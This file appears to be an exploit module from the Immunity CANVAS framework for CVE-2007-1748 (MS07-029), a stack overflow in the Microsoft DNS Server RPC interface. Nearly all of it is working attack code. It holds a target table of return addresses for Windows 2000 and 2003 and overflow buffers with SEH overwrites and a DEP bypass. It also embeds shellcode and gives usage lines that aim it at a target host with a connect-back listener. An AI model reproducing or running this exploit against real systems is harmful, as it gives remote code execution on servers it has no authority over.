#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from msrpcexploit import msrpcexploit

# GUI info
NAME='Microsoft DNS Server RPC Interface Overflow'
DESCRIPTION='Microsoft DNS Server RPC Interface Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='04/04/2007'
DOCUMENTATION['CVE Name'] = 'CVE-2007-1748'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1748'
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION['Notes']=''
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/ms07-029.mspx'
VERSION='1.0'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','2003']
PROPERTY['MSADV']='MS07-029'
CHANGELOG="""
KK 08/10/07:
- Added 2003 SP1 and SP2 with DEP targets, thanks to Nicolas P.
- Octal encoding for the DNS string, removed shellcode encoding to save space
"""

NOTES="""
Tested on:
Windows 2000 Advanced Server SP4 English UP2DATE
Windows 2003 Server Standard SP0 English OOTB
Windows 2003 Server Standard SP1 English OOTB (with DEP AlwaysOff)
Windows 2003 Server Standard SP2 English OOTB (with DEP AlwaysOff)
Windows 2003 Server Standard SP2 English OOTB (with DEP OptOut)

Usage:
./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
./exploits/ms07_029/ms07_029.py -v 6 -t 10.10.13.40 -l 10.10.13.1 -d 5555
"""

targets = {
    0: ['Autoversioning (N/A)',0],
    1: ['Windows 2000 SP4','\xf7'],
    2: ['Windows 2000 SP3','\x5a'],
    3: ['Windows 2000 SP0','\x21'],
    #2003 SP0, SP1 and SP2 without DEP targets
    4: ['Windows 2003 SP0 (without DEP)',0x7ffc07a4],
    5: ['Windows 2003 SP1 and SP2 (without DEP)',0x7ffc07a4],
    #2003 SP1 and SP2 with DEP targets
    6: ['Windows 2003 SP1 and SP2 English (with DEP)',0x76a80000],
    7: ['Windows 2003 SP1 and SP2 French (with DEP)',0x76a30000],
    8: ['Windows 2003 SP1 and SP2 German, Italian and Japanese (with DEP)',0x76970000]
}


class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.name           = NAME
        self.UUID           = u'50abc2a4-574d-40b3-9d66-ee4fd5fba076'
        self.uuidversion    = u'5.0'
        self.targetfunction = 1
        self.autoversion    = 0
        self.subesp         = 2000
        self.listenerArgsDict['fromcreatethread'] = 1

    def encodeshellcode(self,rawshellcode):
        #no encoding needed, it saves some space
        self.shellcode=rawshellcode
        self.log('Shellcode length: %d'%(len(rawshellcode)))
        return self.shellcode
 
    def buildConnectionList(self):
        if self.connectionList!=[]:
            return self.connectionList 
        if self.port==0:
            self.searchifids()                
        else:
            self.connectionList+=[u'ncacn_ip_tcp:%s[%d]'%(self.host,self.port)]
        return self.connectionList
    
    def escape_octal(self,buf):
        data=''
        for c in buf:
            data+='\\%o'%(ord(c))
        return data

    def s_dce_string(self,mystr): #put that into msrpc.py some day
        ret=''
        mystr+='\0' #add null byte
        size=len(mystr)
        ret+=struct.pack('<LLL',size,0,size)
        ret+=mystr
        while (len(ret)%4)!=0:
            ret+='\0' #padding
        return ret

    def buildDcePacket(self):
        self.info,self.eip=targets[self.version]        

        packet=''
        data=''
        if self.version>=6: #Windows 2003 (with DEP)
            #using Nicolas P. technique here, with his authorization!
            data+='A'*0x1c1
            data+=struct.pack('<L',self.eip+0x1da7)
            data+='B'*0x14
            data+=struct.pack('<LLL',0xed,self.eip+0x1da4,0x7ffe0300)
            data+='CCC\xff' #triggers an exception
            data+=struct.pack('<L',self.eip+0x109c)
            data+='DDDD'
            data+=struct.pack('<LLLL',0xffffffff,0x22,0x7ffe0270,0x4) #ZwSetInformationProcess parameters
            data+='E'*(0x3f5-len(data))
            data+=struct.pack('<L',self.eip+0x135bf) #jmp esp
            data+='F'*(0x661-len(data))
            data+=struct.pack('<L',self.eip+0x2566) #adjust stack,returns
            data+='G'*0x10
            data+=self.shellcode
            data+='H'*(0x2000-len(data)) #triggers exception
            data=self.escape_octal(data)
            
            packet+=struct.pack('<L',0)
            packet+=struct.pack('<L',1)
            packet+=self.s_dce_string(data)
            packet+=struct.pack('<L',0)
            packet+=struct.pack('<L',0)

        elif self.version>=4: #Windows 2003 (without DEP)
            data+='A'*0x635
            if self.version==5:
                data+='A'*0x28 #Windows 2003 SP1 and SP2: slightly different buffer
            data+='\xeb\x06' #jmp forward
            data+='BB'
            data+=struct.pack('<L',self.eip) #SEH
            data+=self.shellcode
            data+='C'*(0x2000-len(data)) #triggers exception
            data=self.escape_octal(data)

            packet+=struct.pack('<L',0)
            packet+=struct.pack('<L',1)
            packet+=self.s_dce_string(data)
            packet+=struct.pack('<L',0)
            packet+=struct.pack('<L',0)

        else: #Windows 2000
            offset=(0x1d0*2)-240+3 #691
            data+='\x41\x83\xc2\x14\xff\xe2\x90'
            data+='A'*(240-len(data))
            data+='\\'*(offset-240)
            data+=self.eip #self.eip is only 1 byte here

            packet+=struct.pack('<L',0)
            packet+=struct.pack('<L',1)
            packet+=struct.pack('<LLL',len(data)+1,0,len(data)+1) #DO NOT USE s_dce_string()
            packet+=data
            packet+=struct.pack('<L',0)
            packet+=struct.pack('<L',2)
            packet+=self.s_dce_string(self.shellcode)
        return packet

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def usage(self):
        print 'Usage: %s -v version -t host -p port -l localip -d localport\n'%(sys.argv[0])
        self.displayVersions()
    
if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
